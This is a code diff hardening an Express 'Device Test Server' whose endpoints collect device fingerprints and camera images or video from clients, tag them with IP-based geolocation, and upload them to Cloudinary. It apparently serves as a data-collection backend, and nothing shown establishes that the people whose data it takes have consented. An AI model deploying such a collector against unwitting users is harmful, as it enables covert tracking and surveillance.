@@ -1,15 +1,35 @@
 const express = require('express');
 const cloudinary = require('cloudinary').v2;
 const geoip = require('geoip-lite');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+const crypto = require('crypto');
 
 // Configure Cloudinary
-cloudinary.config({
-  cloud_name: process.env.CLOUDINARY_CLOUD_NAME || process.env.CLOUD_NAME,
-  api_key: process.env.CLOUDINARY_API_KEY || process.env.API_KEY,
-  api_secret: process.env.CLOUDINARY_API_SECRET || process.env.API_SECRET
-});
+try {
+  cloudinary.config({
+    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+    api_key: process.env.CLOUDINARY_API_KEY,
+    api_secret: process.env.CLOUDINARY_API_SECRET
+  });
+} catch (error) {
+  console.error('Cloudinary configuration error:', error);
+  process.exit(1);
+}
 
 const app = express();
+
+// Security middleware
+app.use(helmet());
+app.use(helmet.hidePoweredBy());
+
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 100, // limit each IP to 100 requests per windowMs
+  message: 'Too many requests from this IP, please try again later'
+});
+app.use(limiter);
 
 // Middleware
 app.use(express.json({
@@ -47,7 +67,8 @@ function getClientInfo(req) {
     ip,
     geo: geo ? {
       country: geo.country,
-      city: geo.city
+      city: geo.city,
+      region: geo.region
     } : null,
     userAgent: req.headers['user-agent'],
     timestamp: new Date().toISOString()
@@ -58,16 +79,27 @@ function logDataCollection(type, data) {
   console.log(`[DATA COLLECTED] ${type} from ${data.ip}`);
 }
 
+function generateHash(data) {
+  return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
+}
+
 async function uploadToCloudinary(data, folderPath) {
-  const base64Data = Buffer.from(JSON.stringify(data)).toString('base64');
-  return await cloudinary.uploader.upload(
-    `data:application/json;base64,${base64Data}`,
-    {
-      folder: folderPath,
-      resource_type: 'raw',
-      format: 'json'
-    }
-  );
+  try {
+    const base64Data = Buffer.from(JSON.stringify(data)).toString('base64');
+    return await cloudinary.uploader.upload(
+      `data:application/json;base64,${base64Data}`,
+      {
+        folder: folderPath,
+        resource_type: 'raw',
+        format: 'json',
+        overwrite: false,
+        unique_filename: true
+      }
+    );
+  } catch (error) {
+    console.error('Cloudinary upload error:', error);
+    throw error;
+  }
 }
 
 // Routes
@@ -75,26 +107,34 @@ app.get('/', (req, res) => {
   res.json({
     status: 'active',
     message: 'Device Test Server Running',
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
+    version: '1.0.0'
   });
 });
 
 app.post('/collect-fingerprint', async (req, res) => {
   try {
-    if (!req.body) {
-      return res.status(400).json({ error: 'No data received' });
+    if (!req.body || typeof req.body !== 'object') {
+      return res.status(400).json({ error: 'Invalid fingerprint data' });
     }
 
     const clientInfo = getClientInfo(req);
+    const fingerprintHash = generateHash(req.body);
+    
     const result = await uploadToCloudinary(
-      { ...clientInfo, ...req.body },
+      { 
+        ...clientInfo, 
+        ...req.body,
+        fingerprintHash 
+      },
       'fingerprints'
     );
 
-    console.log('Successfully stored fingerprint');
+    logDataCollection('fingerprint', clientInfo);
     res.json({ 
       success: true, 
-      url: result.secure_url 
+      url: result.secure_url,
+      hash: fingerprintHash
     });
 
   } catch (error) {
@@ -109,19 +149,44 @@ app.post('/collect-fingerprint', async (req, res) => {
 app.post('/collect-media', async (req, res) => {
   try {
     const { data, metadata } = req.body;
-    const result = await cloudinary.uploader.upload(data, {
-      folder: 'media',
-      resource_type: metadata.media_type === 'image' ? 'image' : 'video'
-    });
+    
+    if (!data || !metadata || !metadata.media_type) {
+      return res.status(400).json({ error: 'Invalid media data' });
+    }
 
-    res.json({ success: true, url: result.secure_url });
+    const clientInfo = getClientInfo(req);
+    const resourceType = metadata.media_type === 'image' ? 'image' : 'video';
+    
+    const result = await cloudinary.uploader.upload(
+      `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`, 
+      {
+        folder: 'media',
+        resource_type: resourceType,
+        overwrite: false,
+        unique_filename: true
+      }
+    );
+
+    logDataCollection('media', clientInfo);
+    res.json({ 
+      success: true, 
+      url: result.secure_url,
+      public_id: result.public_id
+    });
   } catch (error) {
     console.error('Media upload error:', error);
-    res.status(500).json({ error: 'Failed to save media' });
+    res.status(500).json({ 
+      error: 'Failed to save media',
+      details: process.env.NODE_ENV === 'development' ? error.message : null
+    });
   }
 });
 
 // Error handling
+app.use((req, res, next) => {
+  res.status(404).json({ error: 'Not found' });
+});
+
 app.use((error, req, res, next) => {
   console.error('Server error:', error);
   res.status(500).json({ error: 'Internal server error' });
@@ -130,4 +195,5 @@ app.use((error, req, res, next) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
 });
